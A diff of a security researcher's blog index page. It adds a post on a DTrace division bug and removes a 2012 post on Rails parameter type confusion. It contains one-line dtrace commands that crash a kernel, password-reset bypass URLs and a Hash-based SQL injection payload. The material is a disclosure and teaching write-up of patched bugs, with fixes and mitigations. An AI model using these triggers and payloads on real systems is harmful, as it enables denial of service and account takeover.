@@ -9,7 +9,7 @@
   <meta name="author" content="Ben Murphy">
 
   
-  <meta name="description" content="The /proc permissions in Illumos were optional. I&rsquo;m not sure how long this has been an issue but looking at the history of the files associated &hellip;">
+  <meta name="description" content="For some background check John Regehr&rsquo;s excellent post on the history of problems caused by dividing INT_MIN by -1. DTrace is an interpreter &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -76,6 +76,50 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2017/03/07/dtrace-division-by-zero/">DTrace Division by Zero</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2017-03-07T09:55:03+00:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>For some background check John Regehr&rsquo;s <a href="http://blog.regehr.org/archives/887">excellent post</a> on the history of problems caused by dividing INT_MIN by -1. DTrace is an interpreter that runs inside the kernel on both Illumos and OSX. Before it was <a href="https://github.com/joyent/illumos-joyent/commit/8a5ff7873220bd2725876b6ef7fdd2bceff60dd3">patched</a> in Illumos it was possible to create an expression to divide INT_MIN by -1 and this would cause the kernel to crash.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo dtrace -n 'BEGIN{v = 0x8000000000000000LL; print((long)v/-1)}'
+</span><span class='line'>sudo dtrace -n 'BEGIN{v = 0x8000000000000000LL; print((long)v%-1)}'</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is still an issue in OSX. I emailed them a month ago along with links to other DTrace issues that have been fixed in Illumos and not OSX and haven&rsquo;t heard back. Since this is not really a security issue I&rsquo;m posting it here. You need root in order to trigger the DTrace division by zero and if you have root you can already reboot the machine :/. You also need root to trigger all of the other issues.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -4555,329 +4599,9 @@ authentication on Redis systems.</p>
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2012/05/15/abusing-dynamic-types-for-fun-and-profit/">Abusing Dynamic Types for Fun and Profit</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2012-05-15T11:39:00+01:00" pubdate data-updated="true"></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Most Rails applications don&rsquo;t properly sanitise user input when passing it to queries (UPDATE: Rails has fixed the problems raised in this article so it was mostly a Rails problem rather than an application programmer problem). I&rsquo;m going to use an example to illustrate this problem.</p>
-
-<h2>The Scenario</h2>
-
-<p>Johnny has been tasked to add a password reset feature to his Rails application. So he adds a reset_token to his User model and a PasswordsController class to the application. When the user forgets their password they type in their email and a reset_token is generated and saved on the User model and a url containing the reset token is sent to the users email address. The url looks like <code>/users/1/passwords/edit?reset_token=kjksldjflskdjf</code>. This reset token is then checked when the user resets their password. Johnny writes the following code in the PasswordsController:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">update</span>
-</span><span class='line'>  <span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">find_by_id_and_reset_token</span><span class="p">(</span>
-</span><span class='line'>                 <span class="n">params</span><span class="o">[</span><span class="ss">:user_id</span><span class="o">]</span><span class="p">,</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">]</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span> <span class="vi">@user</span><span class="o">.</span><span class="n">update_password</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:user</span><span class="o">][</span><span class="ss">:password</span><span class="o">]</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">redirect_to</span><span class="p">(</span><span class="n">url_after_update</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">else</span>
-</span><span class='line'>    <span class="n">flash_failure_after_update</span>
-</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
-</span><span class='line'>  <span class="k">end</span>
-</span><span class='line'><span class="k">end</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Johnny deploys this new feature to the staging environment and Mary is given the task to test it. Now Mary is quite clever and checks what happens if she removes the reset_token parameter from the url and changes the user id. She visits the url <code>/users/2/passwords/edit</code> and finds that she can change the password for any user that has not requested their password to be reset. She raises this as a critical bug.</p>
-
-<p>Johnny reproduces the problem on his machine and notices it is is doing the following query:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>User Load (0.2ms)  SELECT `users`.* FROM `users` WHERE `users`.`id` = 2 
-</span><span class='line'>  AND `users`.`reset_token` IS NULL LIMIT 1</span></code></pre></td></tr></table></div></figure>
-
-
-<p>He realises he needs to stop users from not sending the reset_token parameter because if <code>params[:reset_token]</code> is <code>nil</code> then they can update any user who hasn&rsquo;t requested a password reset. He updates the code in PasswordController to the following:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">update</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">].</span><span class="n">blank?</span>
-</span><span class='line'>    <span class="n">flash_failure_after_update</span>
-</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
-</span><span class='line'>    <span class="k">return</span>
-</span><span class='line'>  <span class="k">end</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">find_by_id_and_reset_token</span><span class="p">(</span>
-</span><span class='line'>                 <span class="n">params</span><span class="o">[</span><span class="ss">:user_id</span><span class="o">]</span><span class="p">,</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">]</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span> <span class="vi">@user</span><span class="o">.</span><span class="n">update_password</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:user</span><span class="o">][</span><span class="ss">:password</span><span class="o">]</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">redirect_to</span><span class="p">(</span><span class="n">url_after_update</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">else</span>
-</span><span class='line'>    <span class="n">flash_failure_after_update</span>
-</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
-</span><span class='line'>  <span class="k">end</span>
-</span><span class='line'><span class="k">end</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Mary tries her trick again but it doesn&rsquo;t work this time. But Mary has more tricks in her bag and this time she uses the url <code>/users/2/passwords/edit?reset_token[]</code> . Again she is able to change the password for any user that has not had a reset_token generated.</p>
-
-<p>Johnny reproduces the problem on his machine and sees it doing the same query:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>User Load (0.2ms)  SELECT `users`.* FROM `users` WHERE `users`.`id` = 2 
-</span><span class='line'>  AND `users`.`reset_token` IS NULL LIMIT 1</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Johnny is completely stumped as to how nil.blank? could be false. He adds some logging and finds the <code>params[:reset_token]</code> is actually an array containing a nil element: <code>[nil]</code>. He decides to fix the problem by calling <code>to_s</code> on the query parameters.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">update</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">].</span><span class="n">blank?</span>
-</span><span class='line'>    <span class="n">flash_failure_after_update</span>
-</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
-</span><span class='line'>    <span class="k">return</span>
-</span><span class='line'>  <span class="k">end</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">find_by_id_and_reset_token</span><span class="p">(</span>
-</span><span class='line'>                 <span class="n">params</span><span class="o">[</span><span class="ss">:user_id</span><span class="o">].</span><span class="n">to_s</span><span class="p">,</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">].</span><span class="n">to_s</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span> <span class="vi">@user</span><span class="o">.</span><span class="n">update_password</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:user</span><span class="o">][</span><span class="ss">:password</span><span class="o">]</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">redirect_to</span><span class="p">(</span><span class="n">url_after_update</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">else</span>
-</span><span class='line'>    <span class="n">flash_failure_after_update</span>
-</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
-</span><span class='line'>  <span class="k">end</span>
-</span><span class='line'><span class="k">end</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Not Just Arrays (SQL Manipulation)</h2>
-
-<p>If Johnny had a used the <code>where</code> function instead of <code>find_by_</code> then an attacker could have exploited it by passing in a <code>Hash</code> instead of an <code>Array</code>.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">update</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">].</span><span class="n">blank?</span>
-</span><span class='line'>    <span class="n">flash_failure_after_update</span>
-</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
-</span><span class='line'>    <span class="k">return</span>
-</span><span class='line'>  <span class="k">end</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="ss">:id</span> <span class="o">=&gt;</span> <span class="n">params</span><span class="o">[</span><span class="ss">:user_id</span><span class="o">]</span><span class="p">,</span> <span class="ss">:reset_token</span> <span class="o">=&gt;</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">]</span><span class="p">)</span><span class="o">.</span><span class="n">limit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span> <span class="vi">@user</span><span class="o">.</span><span class="n">update_password</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:user</span><span class="o">][</span><span class="ss">:password</span><span class="o">]</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">redirect_to</span><span class="p">(</span><span class="n">url_after_update</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">else</span>
-</span><span class='line'>    <span class="n">flash_failure_after_update</span>
-</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
-</span><span class='line'>  <span class="k">end</span>
-</span><span class='line'><span class="k">end</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>For example Mary could of sent the url <code>/users/2/passwords/edit?reset_token[users.id]=2</code>. The query then performed would have been:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>User Load (0.2ms)  SELECT `users`.* FROM `users` WHERE `users`.`id` = 2 
-</span><span class='line'>  AND `users`.`id` = 2 LIMIT 1</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The user is able to change the token filter to a filter on a column of their choice. On previous versions of Rails this attack can be escalated
-to arbitrary SQL injection. This attack uses the <a href="https://groups.google.com/group/rubyonrails-security/browse_thread/thread/6a1e473744bc389b">previously fixed issue</a> of SQL injection in table names and columns. This bug was originally not
-as serious because you would not normally let a user choose arbitrary columns or table names in a query. However, with the SQL Manipulation bug an
-attacker is now able to change table and column names to perform SQL injection.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>params[:role_id] = {"user_details.id` = 1 or 1 = 1); -- " =&gt; 1}
-</span><span class='line'>UserDetail.find(:all, :conditions =&gt; {:role_id =&gt; params[:role_id]})
-</span><span class='line'>
-</span><span class='line'>UserDetail Load (0.5ms)   SELECT * FROM `users` WHERE
-</span><span class='line'>(`user_details`.`id` = 1 or 1 = 1); -- ` = 1)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This <code>Hash</code> problem is actually a security bug in rails and the rails team has released a patch for it.</p>
-
-<h2>Underlying Problem</h2>
-
-<p>The problem is developers expect the user input to be a <code>String</code> but it can also be an <code>Array</code> or a <code>Hash</code> and Rails has quite different behaviour if a <code>Hash</code> or an <code>Array</code> is passed in. The <code>Hash</code> is particularly troubling because if you have a filter on column X then a user can change it to be a filter on column Y. Example:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">001</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="ss">:id</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span> <span class="ss">:confirmation_token</span> <span class="o">=&gt;</span> <span class="s2">&quot;foo&quot;</span><span class="p">)</span>
-</span><span class='line'>  <span class="no">User</span> <span class="no">Load</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">4</span><span class="n">ms</span><span class="p">)</span>  <span class="no">SELECT</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">*</span> <span class="no">FROM</span> <span class="sb">`users`</span> <span class="no">WHERE</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">`</span><span class="nb">id</span><span class="sb">` = 1 </span>
-</span><span class='line'><span class="sb">    AND `</span><span class="n">users</span><span class="sb">`.`</span><span class="n">confirmation_token</span><span class="sb">` = &#39;foo&#39;</span>
-</span><span class='line'><span class="sb">=&gt; []</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">002</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="ss">:id</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span> <span class="ss">:confirmation_token</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="s2">&quot;users.id&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;1&quot;</span><span class="p">})</span>
-</span><span class='line'>  <span class="no">User</span> <span class="no">Load</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">4</span><span class="n">ms</span><span class="p">)</span>  <span class="no">SELECT</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">*</span> <span class="no">FROM</span> <span class="sb">`users`</span> <span class="no">WHERE</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">`</span><span class="nb">id</span><span class="sb">` = 1 </span>
-</span><span class='line'><span class="sb">    AND `</span><span class="n">users</span><span class="sb">`.`</span><span class="nb">id</span><span class="sb">` = 1</span>
-</span><span class='line'><span class="sb">=&gt; [#&lt;User id: 1, email: &quot;benmmurphy@gmail.com&quot;, encrypted_password: &quot;f1fcf94f12b17a447e1c4a98ba2bae934aacabb7&quot;, salt: &quot;abcb87e3031102d110cf87734d39d8a1e6d8c03e&quot;, confirmation_token: nil, remember_token: &quot;975dc5fb3524a90f1a6aff4c1a111d2cd8bfcc50&quot;, created_at: &quot;2012-05-15 08:28:01&quot;, updated_at: &quot;2012-05-15 08:28:01&quot;&gt;]</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This <code>Hash</code> trick only seems to work on <code>where</code> filterings and not <code>find_by</code> methods:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">006</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="no">User</span><span class="o">.</span><span class="n">find_by_id_and_confirmation_token</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;users.id&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;1&quot;</span><span class="p">})</span>
-</span><span class='line'><span class="no">ArgumentError</span><span class="p">:</span> <span class="no">Unknown</span> <span class="n">key</span><span class="p">:</span> <span class="n">users</span><span class="o">.</span><span class="n">id</span>
-</span><span class='line'>  <span class="n">from</span><span class="sr"> /Users/</span><span class="n">benmurphy</span><span class="o">/.</span><span class="n">rbenv</span><span class="o">/</span><span class="n">versions</span><span class="o">/</span><span class="mi">1</span><span class="o">.</span><span class="mi">9</span><span class="o">.</span><span class="mi">2</span><span class="o">-</span><span class="n">p290</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ruby</span><span class="o">/</span><span class="n">gems</span><span class="o">/</span><span class="mi">1</span><span class="o">.</span><span class="mi">9</span><span class="o">.</span><span class="mi">1</span><span class="o">/</span><span class="n">gems</span><span class="o">/</span><span class="n">activesupport</span><span class="o">-</span><span class="mi">3</span><span class="o">.</span><span class="mi">2</span><span class="o">.</span><span class="mi">2</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">active_support</span><span class="o">/</span><span class="n">core_ext</span><span class="o">/</span><span class="nb">hash</span><span class="o">/</span><span class="n">keys</span><span class="o">.</span><span class="n">rb</span><span class="p">:</span><span class="mi">44</span><span class="ss">:in</span> <span class="sb">`block in assert_valid_keys&#39;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Vulnerable Code</h2>
-
-<ul>
-<li><a href="https://github.com/thoughtbot/clearance">https://github.com/thoughtbot/clearance</a> - Possible to change any users password.</li>
-<li>Rails ( 2.3.x, &lt; 3.2.6, &lt;3.1.6, &lt; 3.0.14) SQL manipulation/SQL injection anywhere there is use of <code>where()</code> or <code>find()</code> that takes user input.</li>
-</ul>
-
-
-<h2>Fixes</h2>
-
-<ul>
-<li>Rails has <a href="http://weblog.rubyonrails.org/2012/6/12/ann-rails-3-2-6-has-been-released/">released 3.2.6</a> that fixes both the nil issue and SQL manipulation/injection problems with <code>Hash</code>.</li>
-<li>Clearance has released a new version <a href="http://robots.thoughtbot.com/post/24197949040/clearance-0-16-3-fixes-a-password-reset-vulnerability">0.6.13</a> which fixes the problem with nil parameters</li>
-</ul>
-
-
-<h2>Mitigation</h2>
-
-<p>It is recommended that you install the Rails patches to fix the <code>Hash</code> problem and nil problem. Also, with security sensitive code I strongly recommend all query
-parameters be coerced to the type you expect them to be. For example if you expect a parameter to be a <code>String</code> you should call <code>to_s</code> on it.</p>
-
-<h2>Previous Work</h2>
-
-<p>The Devise team seem to have been aware of the general problem of users being able to send non-string parameters. They have a <code>ParamFilter</code>
-class that forces all parameters to be <code>String</code>s. It looks like they did this because they had an injection problem with mongoid.</p>
-
-<figure class='code'><figcaption><span>ParamFilter</span><a href='https://github.com/plataformatec/devise/blob/master/lib/devise/param_filter.rb#L26'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># Force keys to be string to avoid injection on mongoid related database.</span>
-</span><span class='line'><span class="k">def</span> <span class="nf">stringify_params</span><span class="p">(</span><span class="n">conditions</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">return</span> <span class="n">conditions</span> <span class="k">unless</span> <span class="n">conditions</span><span class="o">.</span><span class="n">is_a?</span><span class="p">(</span><span class="no">Hash</span><span class="p">)</span>
-</span><span class='line'>  <span class="n">conditions</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="o">|</span>
-</span><span class='line'>    <span class="n">conditions</span><span class="o">[</span><span class="n">k</span><span class="o">]</span> <span class="o">=</span> <span class="n">v</span><span class="o">.</span><span class="n">to_s</span> <span class="k">if</span> <span class="n">param_requires_string_conversion?</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">end</span>
-</span><span class='line'><span class="k">end</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Stay Tuned</h2>
-
-<p>We only covered the issues fixed in 3.2.5 and 3.2.4 in this article. There was another variant of the <code>Hash</code> attack that was fixed in 3.2.6. I will cover
-that in a future article and show how to exploit it.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
+    
+      <a class="prev" href="2">&larr; Older</a>
     
     <a href="/blog/archives">Blog Archives</a>
     
@@ -4888,6 +4612,10 @@ that in a future article and show how to exploit it.</p>
     <section>
   <h1>Recent Posts</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2017/03/07/dtrace-division-by-zero/">DTrace Division by Zero</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2017/01/31/local-privilege-escalation-in-illumos-via-slash-proc/">Local Privilege Escalation in Illumos via /proc</a>
@@ -4903,10 +4631,6 @@ that in a future article and show how to exploit it.</p>
     
       <li class="post">
         <a href="/blog/2015/11/09/zdi-13-XXX-java-sandbox-bypass-1-dot-7-0-10-slash-1-dot-6-0-38-via-proxy-and-jmx/">ZDI-13-XXX (2013) Java Sandbox Bypass (1.7.0_10) / (1.6.0_38) via Proxy and JMX</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/10/23/zdi-13-246-2013-java-1-dot-7-0-15-sandbox-bypass-via-objectoutputstream/">ZDI-13-246 (2013) Java 1.7.0_15 Sandbox Bypass via ObjectOutputStream</a>
       </li>
     
   </ul>
